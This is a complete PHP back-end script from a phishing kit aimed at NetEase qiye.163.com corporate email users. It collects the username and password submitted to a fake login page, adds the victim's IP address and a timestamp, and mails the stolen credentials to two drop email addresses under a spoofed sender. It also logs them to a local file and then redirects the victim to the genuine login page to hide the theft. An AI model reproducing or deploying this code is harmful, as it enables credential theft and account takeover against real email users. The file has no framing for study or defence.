<?php
$date = gmdate("H:i:s | d/m/Y");
$ip = getenv("REMOTE_ADDR");
$message .= "~~~~~~~~~~~~~~~~~ 163 Rezult~~~~~~~~~~~~~~\n";
$message .= "Username :      ".$_POST[accname]."\n";
$message .= "Password :      ".$_POST[password]."\n";
$message .= "IP       :      $ip\n";
$message .= "DATE     :      $date\n";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\n";


$send = "tracyhu.hope1@gmail.com, dropboxz@protonmail.com";
$subject = "qiye-rezult  : $ip";
$header = "From: QIYE-Netease- <sevices@qiye.net>";
@mail($send,$subject,$message,$header);

$fp = fopen('known.txt', 'a');
fwrite($fp, $message);
fclose($fp);

header('Location:https://qiye.163.com/login/');

?>